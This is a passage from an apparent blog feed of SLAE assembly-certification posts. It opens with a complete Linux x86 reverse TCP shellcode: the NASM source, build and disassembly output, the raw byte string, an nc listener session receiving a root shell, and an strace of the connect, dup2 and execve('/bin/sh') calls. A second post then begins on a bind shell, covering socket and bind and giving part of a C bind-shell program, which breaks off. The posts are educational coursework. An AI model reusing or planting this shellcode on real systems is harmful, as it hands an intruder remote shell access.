</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">type</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="p">(</span><span class="no">protocol</span><span class="p">)</span> <span class="no">initialized</span> <span class="no">to</span> <span class="no">zero</span> <span class="no">by</span> <span class="no">the</span> <span class="no">cdq</span> <span class="no">instruction</span> <span class="no">above</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">xchg</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>           <span class="err">;</span> <span class="no">fd</span> <span class="no">on</span> <span class="no">ebx</span> <span class="no">from</span> <span class="no">this</span> <span class="no">point</span> <span class="no">below</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x16a</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">connect</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">struct</span> <span class="no">sockaddr</span> <span class="p">*,</span> <span class="no">socklen_t</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">HOST</span>               <span class="err">;</span> <span class="no">host</span> <span class="no">in</span> <span class="no">network</span> <span class="no">byte</span> <span class="no">order</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">word</span> <span class="no">PORT</span>          <span class="err">;</span> <span class="no">port</span> <span class="no">in</span> <span class="no">network</span> <span class="no">byte</span> <span class="no">order</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">word</span> <span class="mi">0x2</span>           <span class="err">;</span> <span class="no">AF_INET</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">addr</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x10</span>               <span class="err">;</span> <span class="mi">16</span> <span class="no">bytes</span> <span class="no">in</span> <span class="no">total</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">edx</span>                 <span class="err">;</span> <span class="no">addrlen</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x2</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">newfd</span>
</span><span class='line'><span class="nl">bind_dup2_loop:</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x3f</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">dup2</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span> 
</span><span class='line'>  <span class="no">int</span> <span class="mi">0x80</span>
</span><span class='line'>  <span class="nf">dec</span> <span class="no">ecx</span>
</span><span class='line'>  <span class="nf">jns</span> <span class="no">bind_dup2_loop</span>      <span class="err">;</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">jump</span> <span class="no">if</span> <span class="no">ecx</span> <span class="no">is</span> <span class="no">positive</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">eax</span> <span class="no">is</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">dup2</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="no">above</span> <span class="p">(</span><span class="no">stdin</span> <span class="no">fd</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>                <span class="err">;</span> <span class="no">to</span> <span class="no">null</span> <span class="no">terminate</span> <span class="no">the</span> <span class="no">filename</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xb</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">execve</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x68732f6e</span>         <span class="err">;</span> <span class="no">n</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x69622f2f</span>         <span class="err">;</span> <span class="err">//</span><span class="no">bi</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">filename</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">ecx</span> <span class="p">(</span><span class="no">argv</span><span class="p">)</span> <span class="no">is</span> <span class="mi">0xffffffff</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">dup</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>


<p>To define the remote host and port, like with the bind shell, the configure script should be used with the -h (127.1.1.1 by default) and -r (4242/tcp by default) command-line options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -h 127.2.2.2 -r 1337
</span><span class='line'>Using remote host: 0x0202027f
</span><span class='line'>Using listening port: 0x9210
</span><span class='line'>Using remote port: 0x3905
</span><span class='line'><span class="nv">$ </span>./configure -h 127.0.0.1 -r 1337
</span><span class='line'>Host contains NUL bytes!
</span><span class='line'><span class="nv">$ </span>./configure -h 127.3.3.3 -r 1280
</span><span class='line'>Port contains NUL bytes!
</span><span class='line'><span class="nv">$ </span>./configure
</span><span class='line'>Using remote host: 0x0101017f
</span><span class='line'>Using listening port: 0x9210
</span><span class='line'>Using remote port: 0x9210
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x02-reverse/
</span><span class='line'><span class="nv">$ </span>make
</span><span class='line'>nasm  -f elf32 -o reverse.o reverse.asm
</span><span class='line'>ld -N -zexecstack -o reverse reverse.o
</span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
</span><span class='line'> 8048060:       <span class="m">31</span> c0                   xor    eax,eax
</span><span class='line'> 8048062:       <span class="m">99</span>                      cdq
</span><span class='line'> 8048063:       <span class="m">66</span> b8 <span class="m">67</span> <span class="m">01</span>             mov    ax,0x167
</span><span class='line'> 8048067:       6a <span class="m">02</span>                   push   0x2
</span><span class='line'> 8048069:       5b                      pop    ebx
</span><span class='line'> 804806a:       6a <span class="m">01</span>                   push   0x1
</span><span class='line'> 804806c:       <span class="m">59</span>                      pop    ecx
</span><span class='line'> 804806d:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 804806f:       <span class="m">93</span>                      xchg   ebx,eax
</span><span class='line'> 8048070:       <span class="m">66</span> b8 6a <span class="m">01</span>             mov    ax,0x16a
</span><span class='line'> 8048074:       <span class="m">68</span> 7f <span class="m">01</span> <span class="m">01</span> <span class="m">01</span>          push   0x101017f
</span><span class='line'> 8048079:       <span class="m">66</span> <span class="m">68</span> <span class="m">10</span> <span class="m">92</span>             pushw  0x9210
</span><span class='line'> 804807d:       <span class="m">66</span> 6a <span class="m">02</span>                pushw  0x2
</span><span class='line'> 8048080:       <span class="m">89</span> e1                   mov    ecx,esp
</span><span class='line'> 8048082:       6a <span class="m">10</span>                   push   0x10
</span><span class='line'> 8048084:       5a                      pop    edx
</span><span class='line'> 8048085:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 8048087:       6a <span class="m">02</span>                   push   0x2
</span><span class='line'> 8048089:       <span class="m">59</span>                      pop    ecx
</span><span class='line'>
</span><span class='line'>0804808a &lt;bind_dup2_loop&gt;:
</span><span class='line'> 804808a:       6a 3f                   push   0x3f
</span><span class='line'> 804808c:       <span class="m">58</span>                      pop    eax
</span><span class='line'> 804808d:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 804808f:       <span class="m">49</span>                      dec    ecx
</span><span class='line'> 8048090:       <span class="m">79</span> f8                   jns    804808a &lt;bind_dup2_loop&gt;
</span><span class='line'> 8048092:       <span class="m">99</span>                      cdq
</span><span class='line'> 8048093:       <span class="m">50</span>                      push   eax
</span><span class='line'> 8048094:       6a 0b                   push   0xb
</span><span class='line'> 8048096:       <span class="m">58</span>                      pop    eax
</span><span class='line'> 8048097:       <span class="m">68</span> 6e 2f <span class="m">73</span> <span class="m">68</span>          push   0x68732f6e
</span><span class='line'> 804809c:       <span class="m">68</span> 2f 2f <span class="m">62</span> <span class="m">69</span>          push   0x69622f2f
</span><span class='line'> 80480a1:       <span class="m">89</span> e3                   mov    ebx,esp
</span><span class='line'> 80480a3:       <span class="m">41</span>                      inc    ecx
</span><span class='line'> 80480a4:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'>Shellcode size: 70
</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>68<span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>59<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>99<span class="se">\x</span>50<span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc -lv 127.1.1.1 4242
</span><span class='line'>Listening on <span class="o">[</span>127.1.1.1<span class="o">]</span> <span class="o">(</span>family 0, port 4242<span class="o">)</span>
</span><span class='line'>Connection from localhost <span class="m">38844</span> received!
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="c"># ./shellcode</span>
</span><span class='line'>Shellcode length: 70
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># make strace</span>
</span><span class='line'>Shellcode length: 70
</span><span class='line'><span class="c"># head -n35 reverse.strace</span>
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./shellcode&quot;</span>, <span class="o">[</span><span class="s2">&quot;./shellcode&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">24</span> vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Shellcode length: 70\n&quot;</span>, 21<span class="o">)</span>  <span class="o">=</span> 21
</span><span class='line'>socket<span class="o">(</span>AF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> 3
</span><span class='line'>connect<span class="o">(</span>3, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>4242<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;127.1.1.1&quot;</span><span class="o">)}</span>, 16<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>dup2<span class="o">(</span>3, 2<span class="o">)</span>                              <span class="o">=</span> 2
</span><span class='line'>dup2<span class="o">(</span>3, 1<span class="o">)</span>                              <span class="o">=</span> 1
</span><span class='line'>dup2<span class="o">(</span>3, 0<span class="o">)</span>                              <span class="o">=</span> 0
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, NULL, NULL<span class="o">)</span>          <span class="o">=</span> 0
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x01: Bind TCP Shell]]></title>
    <link href="http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell/"/>
    <updated>2018-05-20T21:51:39+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>

<p>I&rsquo;ve also decided not to call <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> to reuse the port and relied on some implementation-specific behaviour to keep the shellcode smaller.</p>

<p>To perform a network I/O operation a process needs to first call <a href="http://man7.org/linux/man-pages/man2/socket.2.html">socket(2)</a> by specifying the desired protocol and to obtain a file descriptor:</p>

<figure class='code'><figcaption><span>socket(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The domain (also known as family) is implementation-defined, but most of the time it is one of:</p>

<pre><code>+----------+-------------+
|  domain  | description |
+----------+-------------+
| AF_INET  | IPv4        |
| AF_INET6 | IPv6        |
| AF_LOCAL | Unix domain |
+----------+-------------+
</code></pre>

<p>The type specifies the semantics of the communication:</p>

<pre><code>+-------------+-----------------+
|    type     |   description   |
+-------------+-----------------+
| SOCK_STREAM | Stream socket   |
| SOCK_DGRAM  | Datagram socket |
+-------------+-----------------+
</code></pre>

<p>The protocol can be set to zero to select the default one for the combination of domain and type:</p>

<pre><code>+--------------+-----------------+
|   protocol   |   description   |
+--------------+-----------------+
| IPPROTO_TCP  | TCP transport   |
| IPPROTO_UDP  | UDP transport   |
| IPPROTO_SCTP | SCTP transport  |
+--------------+-----------------+
</code></pre>

<figure class='code'><figcaption><span>retrieving the system call number and constants</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall socket
</span><span class='line'><span class="c">#define __NR_socket 359</span>
</span><span class='line'>0x167
</span><span class='line'><span class="nv">$ </span>python -c <span class="s1">&#39;import socket; print socket.AF_INET; print socket.SOCK_STREAM&#39;</span>
</span><span class='line'>2
</span><span class='line'>1
</span></code></pre></td></tr></table></div></figure>


<p>With this in mind the registers will contain the following before and after the system call:</p>

<pre><code>+----------+-------+
| register | value |
+----------+-------+
| eax      | 359   |
| ebx      | 2     |
| ecx      | 1     |
| edx      | 0     |
+----------+-------+
| return   | fd    |
+----------+-------+
</code></pre>

<p>The bind shell will use the AF_INET family with a SOCK_STREAM type. Beware that not all combinations of family and type are valid. Then, one needs to use <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a> to assign a local protocol address to the socket:</p>

<figure class='code'><figcaption><span>bind(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">bind</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">socklen_t</span> <span class="n">addr_len</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The socket address structure, in this case, has to be manually packed and will be IPv4 specific. Nowadays, one should use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> and sockaddr_storage which is large enough for any socket structure, instead:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netdb.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span>
</span><span class='line'><span class="nf">bind_try</span><span class="p">(</span><span class="k">struct</span> <span class="n">addrinfo</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">yes</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">warn</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">yes</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;setsockopt&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>      <span class="n">warn</span><span class="p">(</span><span class="s">&quot;bind&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span>
</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">exec_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>  <span class="kt">int</span>                      <span class="n">ai_ret</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">fd_client</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">socklen_t</span>                <span class="n">sl_client</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">addrinfo</span>          <span class="n">ai_hints</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">addrinfo</span>         <span class="o">*</span><span class="n">ai_ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">ai_srv</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_storage</span>  <span class="n">sa_client</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;usage: port&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ai_hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">ai_hints</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_flags</span> <span class="o">=</span> <span class="n">AI_PASSIVE</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ai_ret</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">ai_hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ai_srv</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;getaddrinfo: %s&quot;</span><span class="p">,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">ai_ret</span><span class="p">));</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ai_ptr</span> <span class="o">=</span> <span class="n">ai_srv</span><span class="p">;</span> <span class="n">ai_ptr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">ai_ptr</span> <span class="o">=</span> <span class="n">ai_ptr</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
